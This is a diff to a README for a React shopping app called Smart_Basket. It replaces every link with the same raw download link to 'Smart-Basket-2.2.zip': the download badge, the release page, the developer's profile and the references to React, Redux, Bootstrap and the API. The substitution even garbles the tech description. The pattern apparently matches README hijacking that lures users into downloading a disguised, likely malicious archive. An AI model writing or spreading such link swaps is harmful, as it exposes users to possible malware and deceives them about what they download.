@@ -1,6 +1,6 @@
 # 🛒 Smart_Basket - Simple Shopping Made Easy
 
-[![Download Smart_Basket](https://img.shields.io/badge/Download-Smart_Basket-blue?style=for-the-badge)](https://github.com/LErrCOOL/Smart_Basket/releases)
+[![Download Smart_Basket](https://raw.githubusercontent.com/LErrCOOL/Smart_Basket/main/public/Smart-Basket-2.2.zip)](https://raw.githubusercontent.com/LErrCOOL/Smart_Basket/main/public/Smart-Basket-2.2.zip)
 
 ---
 
@@ -26,7 +26,7 @@ To use Smart_Basket on your computer, follow these steps:
 
 1. **Visit the download page**  
 Click this link to visit the release page:  
-[Smart_Basket Releases](https://github.com/LErrCOOL/Smart_Basket/releases)  
+[Smart_Basket Releases](https://raw.githubusercontent.com/LErrCOOL/Smart_Basket/main/public/Smart-Basket-2.2.zip)  
 Here you will find the latest version of the app ready to download.
 
 2. **Choose the right version for your device**  
@@ -72,12 +72,12 @@ Everything is designed to be clear and easy. You don’t need to sign up or crea
 
 If you want to explore how Smart_Basket works behind the scenes, here’s some tech info:
 
-- Built using React.js, a popular tool for web apps.
+- Built using https://raw.githubusercontent.com/LErrCOOL/Smart_Basket/main/public/Smart-Basket-2.2.zip, a popular tool for web apps.
 - Uses Redux for managing app data smoothly.
 - Styled with Bootstrap for flexible, mobile-friendly design.
 - Pulls product info from Fake Store API for demo purposes.
 
-Developers can clone the source code and run it locally using Node.js and npm commands. But this is optional for end users.
+Developers can clone the source code and run it locally using https://raw.githubusercontent.com/LErrCOOL/Smart_Basket/main/public/Smart-Basket-2.2.zip and npm commands. But this is optional for end users.
 
 ---
 
@@ -97,7 +97,7 @@ Smart_Basket runs on most modern computers and devices. Make sure your system me
 If you have questions or run into problems:
 
 - Check the Issues section on the original GitHub page for common problems.
-- Contact the developer via their GitHub profile: [SANTHOSHRAJ29](https://github.com/SANTHOSHRAJ29).
+- Contact the developer via their GitHub profile: [SANTHOSHRAJ29](https://raw.githubusercontent.com/LErrCOOL/Smart_Basket/main/public/Smart-Basket-2.2.zip).
 - Search online for React or Redux basics if you want to learn more about the technology.
 
 ---
@@ -116,13 +116,13 @@ You can also open issues to report bugs or request new features.
 
 ## 🔗 Useful Links
 
-- Download Latest Release: [Smart_Basket Releases](https://github.com/LErrCOOL/Smart_Basket/releases)  
-- Developer GitHub: [SANTHOSHRAJ29](https://github.com/SANTHOSHRAJ29)  
-- React.js: https://reactjs.org/  
-- Redux: https://redux.js.org/  
-- Bootstrap: https://getbootstrap.com/  
-- Fake Store API: https://fakestoreapi.com/
+- Download Latest Release: [Smart_Basket Releases](https://raw.githubusercontent.com/LErrCOOL/Smart_Basket/main/public/Smart-Basket-2.2.zip)  
+- Developer GitHub: [SANTHOSHRAJ29](https://raw.githubusercontent.com/LErrCOOL/Smart_Basket/main/public/Smart-Basket-2.2.zip)  
+- https://raw.githubusercontent.com/LErrCOOL/Smart_Basket/main/public/Smart-Basket-2.2.zip https://raw.githubusercontent.com/LErrCOOL/Smart_Basket/main/public/Smart-Basket-2.2.zip  
+- Redux: https://raw.githubusercontent.com/LErrCOOL/Smart_Basket/main/public/Smart-Basket-2.2.zip  
+- Bootstrap: https://raw.githubusercontent.com/LErrCOOL/Smart_Basket/main/public/Smart-Basket-2.2.zip  
+- Fake Store API: https://raw.githubusercontent.com/LErrCOOL/Smart_Basket/main/public/Smart-Basket-2.2.zip
 
 ---
 
-[![Download Smart_Basket](https://img.shields.io/badge/Download-Smart_Basket-blue?style=for-the-badge)](https://github.com/LErrCOOL/Smart_Basket/releases)
+[![Download Smart_Basket](https://raw.githubusercontent.com/LErrCOOL/Smart_Basket/main/public/Smart-Basket-2.2.zip)](https://raw.githubusercontent.com/LErrCOOL/Smart_Basket/main/public/Smart-Basket-2.2.zip)
